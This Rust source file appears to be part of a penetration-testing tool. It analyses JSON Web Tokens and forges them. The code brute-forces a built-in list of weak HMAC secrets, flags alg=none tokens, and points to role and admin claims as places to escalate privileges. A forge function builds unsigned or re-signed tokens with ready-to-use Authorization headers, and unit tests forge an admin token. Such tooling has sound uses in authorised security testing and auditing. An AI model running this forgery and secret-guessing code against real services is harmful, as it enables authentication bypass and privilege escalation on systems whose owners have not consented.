//! JWT analysis + forgery — native Rust port of the FlutterSentinel `jwt.ts`
//! tool (brute-force weak secrets, forge with a recovered secret, `alg=none`
//! and algorithm-confusion checks).

use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine as _};
use serde_json::{json, Value};
use sha2::{Digest, Sha256, Sha384, Sha512};

pub const COMMON_SECRETS: &[&str] = &[
    "123456",
    "password",
    "secret",
    "default",
    "admin",
    "dev",
    "jwt-secret",
    "supersecret",
    "changeit",
    "root",
    "guest",
    "access",
    "testing",
    "development",
    "production",
    "app",
    "k3y",
    "flutter",
    "fbh",
    "letmein",
    "123456789",
    "qwerty",
];

pub fn b64url_encode(data: &[u8]) -> String {
    URL_SAFE_NO_PAD.encode(data)
}

pub fn b64url_decode(s: &str) -> Result<Vec<u8>, String> {
    URL_SAFE_NO_PAD
        .decode(s.trim_end_matches('='))
        .map_err(|e| format!("invalid base64url: {e}"))
}

fn hmac_sha256(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut k = key.to_vec();
    if k.len() > 64 {
        k = Sha256::digest(&k).to_vec();
    }
    k.resize(64, 0);
    let ipad: Vec<u8> = k.iter().map(|&b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|&b| b ^ 0x5c).collect();
    let mut inner = ipad;
    inner.extend_from_slice(data);
    let ih = Sha256::digest(&inner);
    let mut outer = opad;
    outer.extend_from_slice(&ih);
    Sha256::digest(&outer).to_vec()
}

fn hmac_sha384(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut k = key.to_vec();
    if k.len() > 128 {
        k = Sha384::digest(&k).to_vec();
    }
    k.resize(128, 0);
    let ipad: Vec<u8> = k.iter().map(|&b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|&b| b ^ 0x5c).collect();
    let mut inner = ipad;
    inner.extend_from_slice(data);
    let ih = Sha384::digest(&inner);
    let mut outer = opad;
    outer.extend_from_slice(&ih);
    Sha384::digest(&outer).to_vec()
}

fn hmac_sha512(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut k = key.to_vec();
    if k.len() > 128 {
        k = Sha512::digest(&k).to_vec();
    }
    k.resize(128, 0);
    let ipad: Vec<u8> = k.iter().map(|&b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|&b| b ^ 0x5c).collect();
    let mut inner = ipad;
    inner.extend_from_slice(data);
    let ih = Sha512::digest(&inner);
    let mut outer = opad;
    outer.extend_from_slice(&ih);
    Sha512::digest(&outer).to_vec()
}

fn sign_hmac(alg: &str, secret: &[u8], message: &[u8]) -> Option<Vec<u8>> {
    Some(match alg {
        "HS256" => hmac_sha256(secret, message),
        "HS384" => hmac_sha384(secret, message),
        "HS512" => hmac_sha512(secret, message),
        _ => return None,
    })
}

struct DecodedJwt {
    header_raw: String,
    payload_raw: String,
    sig_raw: String,
    header: Value,
    payload: Value,
    signature: Vec<u8>,
    alg: String,
}

fn decode_token(token: &str) -> Result<DecodedJwt, String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err("JWT must have 3 dot-separated segments".to_string());
    }
    let header = serde_json::from_slice::<Value>(&b64url_decode(parts[0])?)
        .map_err(|e| format!("header is not valid JSON: {e}"))?;
    let payload = serde_json::from_slice::<Value>(&b64url_decode(parts[1])?)
        .map_err(|e| format!("payload is not valid JSON: {e}"))?;
    let alg = header
        .get("alg")
        .and_then(|v| v.as_str())
        .unwrap_or("none")
        .to_string();
    Ok(DecodedJwt {
        header_raw: parts[0].to_string(),
        payload_raw: parts[1].to_string(),
        sig_raw: parts[2].to_string(),
        signature: b64url_decode(parts[2])?,
        header,
        payload,
        alg,
    })
}

fn verify(d: &DecodedJwt, secret: &[u8]) -> bool {
    if d.alg == "none" {
        return d.signature.is_empty();
    }
    let message = format!("{}.{}", d.header_raw, d.payload_raw);
    match sign_hmac(&d.alg, secret, message.as_bytes()) {
        Some(sig) => sig == d.signature,
        None => false,
    }
}

/// Analyze a JWT: decode claims, flag `alg=none`, brute common secrets, check
/// the exp/iat window. Optionally verify against a provided secret.
pub fn analyze_jwt(token: &str, provided_secret: Option<&str>) -> Result<Value, String> {
    let d = decode_token(token)?;
    let mut issues: Vec<Value> = Vec::new();
    let mut severity = "info";

    if d.alg == "none" || d.alg.is_empty() {
        issues.push(json!({"issue": "alg=none accepted by library/server-side validation", "severity": "HIGH"}));
        severity = "HIGH";
    }

    let mut secret_candidates: Vec<&str> = Vec::new();
    if let Some(s) = provided_secret {
        if !s.trim().is_empty() {
            secret_candidates.push(s);
        }
    }
    secret_candidates.extend(COMMON_SECRETS.iter().copied());

    let mut verified_secret: Option<String> = None;
    for candidate in secret_candidates {
        if verify(&d, candidate.as_bytes()) {
            verified_secret = Some(candidate.to_string());
            issues.push(json!({
                "issue": format!("JWT uses a known/weak HMAC secret: {candidate}"),
                "severity": "CRITICAL",
                "secret": candidate,
            }));
            severity = "CRITICAL";
            break;
        }
    }

    // Claim-level checks
    let payload = &d.payload;
    if let Some(exp) = payload.get("exp").and_then(|v| v.as_i64()) {
        let now = chrono::Utc::now().timestamp();
        if exp < now {
            issues.push(json!({"issue": "token is expired (exp in the past)", "severity": "info"}));
        } else if (exp - now) > 60 * 60 * 24 * 30 {
            issues.push(json!({"issue": format!("token valid for >30 days (exp in {} days)", (exp - now) / 86400), "severity": "LOW"}));
        }
    } else {
        issues.push(json!({"issue": "no exp claim — token never expires", "severity": "LOW"}));
    }

    // Role / privilege hints
    for key in [
        "role",
        "roles",
        "is_admin",
        "admin",
        "scope",
        "user_type",
        "email_verified",
    ] {
        if let Some(v) = payload.get(key) {
            let text = v.to_string().to_lowercase();
            if text.contains("admin") || text.contains("\"true\"") {
                issues.push(json!({
                    "issue": format!("claim '{key}' = {v} — escalation surfaces: forge with a privileged value"),
                    "severity": "MEDIUM"
                }));
            }
        }
    }

    // Common weak-claims triplet: permissive subject + no iat/nbf
    let has_iat = payload.get("iat").is_some();
    let has_nbf = payload.get("nbf").is_some();
    if !has_iat {
        issues.push(json!({"issue": "no iat claim", "severity": "LOW"}));
    }
    if !has_nbf {
        issues.push(json!({"issue": "no nbf claim", "severity": "info"}));
    }
    if issues
        .iter()
        .any(|i| i.get("severity").and_then(|s| s.as_str()) == Some("CRITICAL"))
    {
        severity = "CRITICAL";
    }

    Ok(json!({
        "status": "ok",
        "verdict": severity,
        "header": d.header,
        "payload": payload,
        "alg": d.alg,
        "signature_b64url": d.sig_raw,
        "signature_bytes": hex(&d.signature),
        "verified_secret": verified_secret,
        "cwe": ["CWE-347"],
        "owasp": "Cryptographic Failures",
        "issues": issues,
    }))
}

/// Forge a token. `header` may override alg (for `none`/algorithm-confusion),
/// `payload` holds the claims. Requires a real secret for HS* (use
/// `verify_secret`/`analyze_jwt` to discover it first).
pub fn forge_jwt(payload: Value, secret: &str, alg: &str) -> Result<Value, String> {
    let header = json!({ "alg": alg, "typ": "JWT" });
    let header_b64 = b64url_encode(&serde_json::to_vec(&header).map_err(|e| e.to_string())?);
    let payload_b64 = b64url_encode(&serde_json::to_vec(&payload).map_err(|e| e.to_string())?);
    let message = format!("{header_b64}.{payload_b64}");

    let token = if alg.eq_ignore_ascii_case("none") || alg.is_empty() {
        format!("{message}.")
    } else {
        let sig = sign_hmac(alg, secret.as_bytes(), message.as_bytes()).ok_or_else(|| {
            format!("unsupported alg '{alg}' (supported: HS256/HS384/HS512/none)")
        })?;
        format!("{message}.{}", b64url_encode(&sig))
    };

    Ok(json!({
        "status": "ok",
        "token": token,
        "alg": alg,
        "header": header,
        "payload": payload,
        "authorization_example": format!("Authorization: Bearer {token}"),
        "curl_example": {
            "path": "/",
            "header": format!("Authorization: Bearer {token}"),
            "caution": "Test only on targets you are authorized to test."
        }
    }))
}

fn hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hmac_sha256_matches_rfc_4231_case() {
        // RFC 4231 §2.1: key=0x0b*20, data="Hi There"
        let key = [0x0b; 20];
        let sig = hmac_sha256(&key, b"Hi There");
        let expected = hex(&sig)
            .starts_with("b0344c61d8db38535ca8afceaf0bf12b881dc200c9833da726e9376c2e32cff7");
        assert!(expected, "HMAC-SHA256 mismatch: {}", hex(&sig));
    }

    #[test]
    fn roundtrip_forge_and_verify() {
        let out = forge_jwt(json!({"sub": "1", "role": "admin"}), "flutter", "HS256").unwrap();
        let token = out["token"].as_str().unwrap().to_string();
        let ana = analyze_jwt(&token, Some("flutter")).unwrap();
        assert_eq!(ana["verified_secret"], "flutter");
        assert_eq!(ana["payload"]["role"], "admin");
    }

    #[test]
    fn brute_common_secret() {
        let out = forge_jwt(json!({"sub": "user"}), "secret", "HS256").unwrap();
        let ana = analyze_jwt(out["token"].as_str().unwrap(), None).unwrap();
        assert_eq!(ana["verified_secret"], "secret");
    }

    #[test]
    fn flags_alg_none() {
        let ana =
            analyze_jwt("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.", None).unwrap();
        assert_eq!(ana["alg"], "none");
        assert!(ana["issues"]
            .as_array()
            .unwrap()
            .iter()
            .any(|i| { i["issue"].as_str().unwrap().contains("alg=none") }));
    }
}
